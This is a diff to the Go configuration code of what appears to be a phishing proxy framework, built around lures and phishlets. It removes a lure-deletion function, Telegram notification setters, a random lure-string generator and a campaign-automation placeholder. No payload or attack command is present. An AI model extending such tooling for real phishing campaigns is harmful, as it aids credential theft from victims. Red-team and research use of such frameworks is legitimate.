@@ -795,19 +795,6 @@ func (c *Config) SetLure(index int, l *Lure) error {
 	return nil
 }
 
-func (c *Config) DeleteLure(index int) error {
-	if index >= 0 && index < len(c.lures) {
-		c.lures = append(c.lures[:index], c.lures[index+1:]...)
-		c.lureIds = append(c.lureIds[:index], c.lureIds[index+1:]...)
-	} else {
-		return fmt.Errorf("index out of bounds: %d", index)
-	}
-	c.cfg.Set(CFG_LURES, c.lures)
-	c.cfg.WriteConfig()
-	c.refreshActiveHostnames()
-	return nil
-}
-
 func (c *Config) DeleteLures(index []int) []int {
 	tlures := []*Lure{}
 	tlureIds := []string{}
@@ -1218,31 +1205,6 @@ func (c *Config) GetTelegramBotToken() string {
 	return c.general.Teletoken
 }
 
-func (c *Config) SetTelegramChatID(chatId string) {
-	c.general.Chatid = chatId
-	c.cfg.Set(CFG_GENERAL, c.general)
-	log.Info("Telegram Chat ID set to: %s", chatId)
-	c.cfg.WriteConfig()
-}
-
-func (c *Config) SetTelegramBotToken(token string) {
-	c.general.Teletoken = token
-	c.cfg.Set(CFG_GENERAL, c.general)
-	log.Info("Telegram Bot Token set to: %s", token)
-	c.cfg.WriteConfig()
-}
-
-func (c *Config) SetTelegramEnabled(enabled bool) {
-	c.general.TelegramEnabled = enabled
-	c.cfg.Set(CFG_GENERAL, c.general)
-	if enabled {
-		log.Info("Telegram notifications enabled")
-	} else {
-		log.Info("Telegram notifications disabled")
-	}
-	c.cfg.WriteConfig()
-}
-
 func (c *Config) GetTelegramEnabled() bool {
 	return c.general.TelegramEnabled
 }
@@ -1277,10 +1239,6 @@ func (c *Config) SetUnauthRedirect(enabled bool) {
 		log.Info("unauthorized requests will be served a rendered copy of unauth_url")
 	}
 	c.cfg.WriteConfig()
-}
-
-func (c *Config) GetLureGenerationStrategy() string {
-	return "random"
 }
 
 func (c *Config) SetHttpPort(port int) {
@@ -1393,19 +1351,6 @@ func (c *Config) GetPhishletsDir() string {
 		return c.phishletsDir
 	}
 	return "phishlets"
-}
-
-func GenRandomLureString(strategy string) string {
-	switch strategy {
-	case "random":
-		return GenRandomString(8)
-	default:
-		return GenRandomString(8)
-	}
-}
-
-func AutomateCampaignFromLure(baseURL string, phishletName string, cfg *Config) {
-	log.Info("Campaign automation placeholder: lure=%s phishlet=%s (configure GoPhish for full automation)", baseURL, phishletName)
 }
 
 // =============================================================================
